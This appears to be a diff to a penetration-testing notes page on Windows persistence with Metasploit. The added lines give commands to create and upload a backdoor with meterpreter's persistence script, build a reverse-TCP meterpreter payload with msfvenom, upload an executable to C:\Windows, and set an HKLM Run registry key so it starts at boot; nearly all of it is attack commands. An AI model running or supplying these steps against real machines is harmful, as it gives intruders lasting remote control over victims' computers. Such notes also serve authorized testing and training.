@@ -52,5 +52,17 @@ msf > set LHOST, LPORT 80
 msf > run 
 # anytime we want to connect back to this machine, we just set up a listener with same parameters passed (use multi/handler).
 # Note this persistence will continue even after the victim pc is rebooted.
+# or you can do this through meterpreter
+meterpreter > run persistence -A -X -i 5 -p 8080 -r $ip # creates a backdoor, uploads it to victim, and set the registry keys to start it at boot.
+
+# 5th 
+# Mannual Persistence on the victim machine.
+# a 
+# Create the payload with msfvenom.
+msfvenom -p windows/meterpreter/reverse_tcp -f vbs ......................
+# upload to victim.
+meterpreter > upload exploit.exe C:\Windows
+# edit the registry keys
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\exploit.exe" -v exploit.exe
 ```
 {% endcode %}
